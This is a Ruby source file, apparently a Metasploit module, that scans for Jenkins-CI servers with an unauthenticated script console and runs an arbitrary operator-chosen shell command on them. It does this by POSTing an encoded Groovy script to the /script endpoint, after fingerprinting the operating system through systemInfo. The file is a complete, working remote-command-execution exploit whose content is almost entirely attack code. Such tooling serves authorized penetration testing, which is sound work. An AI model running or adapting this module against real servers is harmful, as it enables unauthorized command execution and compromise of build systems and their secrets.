##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'
require 'cgi'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
      'Description' => %q{
        This module scans for unauthenticated Jenkins-CI script consoles and
        executes the specified command.
      },
      'Author'      =>
        [
             'altonjx',
             'Jeffrey Cap'
        ],
      'References'  => [
        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
        ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console'],
        ],
      'License'     => MSF_LICENSE
      ))

    register_options(
      [
        OptString.new('TARGETURI', [ true,  'The path to the Jenkins-CI application', '/jenkins/' ]),
        OptString.new('COMMAND', [true, 'Command to run in application', 'whoami']),
      ], self.class)
  end

  def fingerprint_os(ip)
    res = send_request_cgi({'uri' => "#{target_uri.path}systemInfo"})

    # Verify that we received a proper systemInfo response
    unless res && res.body.to_s.length > 0
      vprint_error("#{peer} - The server did not reply to our systemInfo request")
    end

    unless res.body.index("System Properties") &&
           res.body.index("Environment Variables")
      if res.body.index('Remember me on this computer')
        vprint_error("#{peer} This Jenkins-CI system requires authentication")
      else
        vprint_error("#{peer} This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
      end
      return
    end

    os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first
    os_info.index(">Windows") ? "cmd.exe /c " : ""
  end

  def run_host(ip)
    command = datastore['COMMAND'].gsub("\\", "\\\\\\")

    prefix = fingerprint_os(ip)
    return if prefix.nil?

    res = send_request_cgi({
      'uri'       => "#{target_uri.path}script",
      'method'    => 'POST',
      'ctype'     => 'application/x-www-form-urlencoded',
      'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
    })

    unless res && res.body.to_s.length > 0
      vprint_error("#{peer} No response received from the server.")
      return
    end

    plugin_output, command_output = pattern_extract(/<pre>(.*?)<\/pre>/m, res.body.to_s)

    if plugin_output !~ /Jenkins\.instance\.pluginManager\.plugins/
      vprint_error("#{peer} The server returned an invalid response.")
      return
    end

    # The output is double-HTML encoded
    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).
             gsub(/\s*(out|err)>\s*/m, '').
             strip

    if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
      output = $1
      print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
    else
      output.split("\n").each do |line|
        print_good("#{peer} #{line.strip}")
      end
    end

    report_vulnerable(output)

  end

  def pattern_extract(pattern, buffer)
    buffer.to_s.scan(pattern).map{ |m| m.first }
  end

  def report_vulnerable(result)
    report_vuln(
      :host   => rhost,
      :port   => rport,
      :proto  => 'tcp',
      :sname  => ssl ? 'https' : 'http',
      :name   => self.name,
      :info   => result,
      :refs   => self.references,
      :exploited_at => Time.now.utc
    )
  end
end
